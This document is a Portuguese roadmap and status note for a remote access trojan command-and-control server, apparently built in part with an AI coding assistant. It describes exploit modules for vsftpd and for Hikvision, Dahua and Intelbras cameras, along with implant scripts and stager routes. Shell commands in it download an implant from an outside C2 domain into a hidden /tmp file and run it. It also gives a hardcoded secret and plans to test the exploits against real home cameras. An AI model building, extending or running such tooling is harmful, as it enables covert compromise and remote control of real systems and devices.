# GeminiRAT C2 — Roadmap & Estado Atual
> Atualizado em: 2026-08-04 | Sessão anterior encerrada por limite de contexto

---

## Estado Atual do Projeto

O GeminiRAT C2 é um servidor Flask/SocketIO para fins educacionais (Techvel Consulting).
A sessão anterior focou em construir o **módulo de exploração completo** — dois caminhos de ataque (servidor direto + agente como ponte), drones para Linux e IoT, e o live log de exploits no painel.

---

## O Que Foi Feito Nesta Sessão

### Módulo de Exploração (aba Exploits)
- **Dois caminhos de ataque implementados:**
  - **Servidor → Alvo direto**: aba "Exploits" do painel chama `/exploits/run` → servidor executa o módulo localmente
  - **Agente Windows → Alvo**: `issueCommand("run_exploit", {...})` → agente baixa e executa o módulo em memória

- **Interface padrão de exploit** definida e obrigatória:
  ```python
  def run(target_ip: str, payload_url: str, log_function) -> None
  ```

- **Exploits criados:**
  - `exploits/vsftpd_234_backdoor.py` — backdoor vsftpd 2.3.4 (Metasploitable2)
  - `exploits/hikvision_rce.py` — CVE-2021-36260 (câmeras Hikvision)
  - `exploits/dahua_auth_bypass.py` — CVE-2021-33044/33045 (câmeras Dahua)
  - `exploits/intelbras_creds.py` — credenciais padrão + probe Sofia UDP 34567

### Drones
- **`payloads/drone.sh`** — agente POSIX sh para Linux:
  - HMAC-SHA256 com `openssl dgst` (`SECRET="mariaeuteamo"`)
  - wget primário + `--no-check-certificate` + fallback HTTP
  - Compatível com Ubuntu 8.04 (Metasploitable2)
  
- **`payloads/drone_iot.sh`** — agente BusyBox/ash para câmeras IoT:
  - Sem HMAC (BusyBox não tem openssl) → token estático `X-IoT-Token`
  - nc como fallback para wget sem suporte a headers
  - Comandos específicos: `config`, `users`, `snapshot`

### Servidor
- **Rota `/stager/<script>`** com whitelist `{"drone.sh", "drone_iot.sh"}` e substituição de placeholders:
  - `%%C2_SERVER_URL%%` → URL do C2
  - `%%IOT_DRONE_TOKEN%%` → token IoT (apenas para drone_iot.sh)
  - `C2_STAGER_BASE_URL` env var para labs sem TLS

- **Rota `/exploits/<name>`** (HMAC required) — serve scripts ao agente
- **Rota `/api/exploits/list`** — lista exploits disponíveis com metadados
- **Rotas `/iot/*`** — register, task, result para drones IoT (auth por `X-IoT-Token`)
- **Handler `EXPLOIT_LOG`** no `post_result` — emite `exploit_activity_log` via WebSocket + `logger.info`

### Painel (`panel.html`)
- **Modal "Run Exploit"** com dropdown de exploits (populado via `/api/exploits/list`)
- **Modal "Exploit Live Log"** (`#exploit-log-modal`) com colorização por conteúdo
- **WebSocket `exploit_activity_log`** sem filtro `agent_id` (modal é contextual)
- **Dropdown usa `ex.filename`** (com `.py`) como `value` — fix crítico para 404

### Agente (`agent.py`)
- **`run_exploit`** em `THREADED_TASKS` — roda em background, logs via `hybrid_log`
- **`hybrid_log`** → `report_worm_activity(msg, "EXPLOIT_LOG")` em tempo real
- **CANARY removido** do `__main__` — não gera mais `CANARY_*.txt`

---

## Bugs Pendentes (Alta Prioridade)

### BUG 1 — Exploit Live Log mostrando 0 linhas
**Sintoma**: Modal abre com nome e IP corretos, mas nenhum log aparece.  
**Fix aplicado**: Removido o filtro `data.agent_id !== selectedAgentId` do handler `exploit_activity_log` no JS.  
**Também adicionado**: `logger.info("[EXPLOIT_LOG] ...")` no servidor para confirmar recebimento.  
**Como verificar**:
1. Reiniciar o servidor
2. Abrir console do browser (F12 → Console)
3. Rodar exploit pelo painel
4. Checar log do servidor: deve aparecer `[EXPLOIT_LOG] agente=... msg=...`
5. Se log do servidor aparece mas modal continua vazio → problema de WebSocket/namespace
6. Se log do servidor NÃO aparece → o agente não está enviando o POST (checar `agent_internal_log.txt`)

---

### BUG 2 — Drone Metasploitable2 não fica online
**Sintoma**: vsftpd explorado com sucesso (shell obtido), mas drone não aparece no painel.  
**Diagnóstico feito**:
- Arquivo `payloads/drone.sh` não existia → criado ✓
- `drone.sh` usava bash avançado → reescrito em POSIX sh ✓
- wget não disponível → wget como primário ✓
- TLS 1.2 incompatível com OpenSSL 0.9.8g → `--no-check-certificate` + HTTP fallback ✓

**Possíveis causas restantes**:
- `AGENT_SHARED_SECRET` no `.env` do servidor não está como `mariaeuteamo`
- Metasploitable2 não consegue alcançar o servidor na porta 443 (firewall?)
- O comando implantado pelo vsftpd não executa (verificar `[ -s /tmp/.d ]`)
- `nohup bash /tmp/.d` falha silenciosamente

**Como debugar**:
```bash
# Na shell da Metasploitable2 (via vsftpd backdoor):
wget -qO /tmp/.d --no-check-certificate 'https://panelwhxami.shop/stager/drone.sh'
echo "Exit code: $?"
ls -la /tmp/.d
wc -c /tmp/.d       # deve ser > 0
head -5 /tmp/.d     # deve mostrar #!/bin/sh e C2=...
sh /tmp/.d          # rodar manualmente para ver erros
```

**Se o servidor não tem TLS no lab local**:
```bash
# No .env do servidor:
C2_STAGER_BASE_URL=http://192.168.0.X:5000
# Isso faz o drone.sh usar HTTP puro
```

---

### BUG 3 — IoT cameras não testadas
**Status**: Exploits criados (`hikvision_rce.py`, `dahua_auth_bypass.py`, `intelbras_creds.py`), mas ainda não testados contra as câmeras reais da rede doméstica.

**Pré-requisitos para testar**:
1. `IOT_DRONE_TOKEN` definido no `.env` do servidor
2. Câmera acessível pela rede onde o agente/servidor roda
3. drone_iot.sh deve conseguir fazer wget para o servidor

**Sequência de teste**:
1. Descobrir IP da câmera (nmap ou roteador)
2. No painel → selecionar agente Windows → Run Exploit → selecionar `dahua_auth_bypass.py` → IP da câmera
3. Monitorar Exploit Live Log
4. Se bypass OK, o drone_iot.sh será implantado → câmera deve aparecer no painel como agente IoT

---

## Checklist do `.env` (crítico)

```env
AGENT_SHARED_SECRET=mariaeuteamo       # DEVE ser exatamente este valor
IOT_DRONE_TOKEN=geminirat-iot          # qualquer string, mas deve estar definido
C2_BASE_URL=https://panelwhxami.shop
C2_STAGER_BASE_URL=                    # deixar vazio para usar C2_BASE_URL
                                       # ou definir http://IP:PORTA para labs locais
```

---

## Melhorias Planejadas (Backlog)

### Alta Prioridade
| Item | Descrição |
|---|---|
| **Fila Offline** | Tasks com status `pending_offline` entregues ao agente ao reconectar |
| **Teste Exploits IoT** | Validar hikvision_rce, dahua_auth_bypass, intelbras_creds contra câmeras reais |

### Média Prioridade (Inteligência)
| Item | Descrição |
|---|---|
| **IOC Generator** | Exportar IPs, processos, hashes em CSV/JSON/STIX |
| **Agent Comparator** | Diff de sysinfo/processos/rede entre dois agentes |
| **Sigma Rules Generator** | Regras de detecção por técnica ATT&CK observada |

### Infraestrutura
| Item | Descrição |
|---|---|
| **Docker** | Dockerfile + docker-compose com volumes SQLite e certs |

### Educacional (Techvel)
| Item | Descrição |
|---|---|
| **Módulo de Conscientização** | Modo demo seguro + relatório "o que o atacante viu" |
| **Alertas Defensivos** | Formato SIEM para cada técnica ATT&CK detectada |

---

## Fluxo de Debug Rápido

### Verify se exploit live log funciona:
1. Abrir console do browser (F12)
2. Rodar exploit
3. `socket.on('exploit_activity_log')` deve disparar — checar na aba Network/WebSocket

### Verify se drone.sh está correto:
```bash
curl https://panelwhxami.shop/stager/drone.sh
# Deve retornar script sh com C2= já preenchido (sem %%C2_SERVER_URL%%)
```

### Verify se exploit é servido:
```bash
# Com HMAC válido do agente — via log do servidor ao rodar exploit
# Ou direto no servidor:
curl -I https://panelwhxami.shop/exploits/dahua_auth_bypass.py
# Deve retornar 200 (com HMAC) ou 401 (sem HMAC)
```

### Verify EXPLOIT_LOG chegando no servidor:
```bash
# No terminal do servidor, durante execução de exploit:
grep "EXPLOIT_LOG" server.log
# Deve aparecer: [EXPLOIT_LOG] agente=<id> msg=--- INÍCIO DO PROCESSO...
```

---

## Arquivos Modificados Nesta Sessão

```
exploits/
  vsftpd_234_backdoor.py    → atualizado (wget flags, [ -s ], nohup)
  hikvision_rce.py          → CRIADO
  dahua_auth_bypass.py      → CRIADO
  intelbras_creds.py        → CRIADO

payloads/
  drone.sh                  → CRIADO (POSIX sh, HMAC, wget)
  drone_iot.sh              → CRIADO (BusyBox, X-IoT-Token)

agente/
  agent.py                  → CANARY removido, hybrid_log EXPLOIT_LOG, run_exploit threaded

ServidorHomologacao.py      → stager route, exploits routes, /iot/* routes,
                              EXPLOIT_LOG handler, logger.info debug

templates/panel.html        → dropdown opt.value=ex.filename, _onExploitSelect por filename,
                              exploit-log-modal, exploit_activity_log sem filtro agent_id
```

---

## Próximos Passos Recomendados

1. **Testar exploit live log** → reiniciar servidor, rodar exploit, checar console e log do servidor
2. **Debugar drone Metasploitable2** → usar comandos manuais na shell vsftpd para isolar onde falha
3. **Configurar `.env`** → garantir `AGENT_SHARED_SECRET=mariaeuteamo` e `IOT_DRONE_TOKEN`
4. **Testar câmeras IoT** → escolher uma câmera, rodar dahua_auth_bypass.py, monitorar live log
5. **Se tudo funcionar** → implementar Fila Offline (próxima feature de alta prioridade)
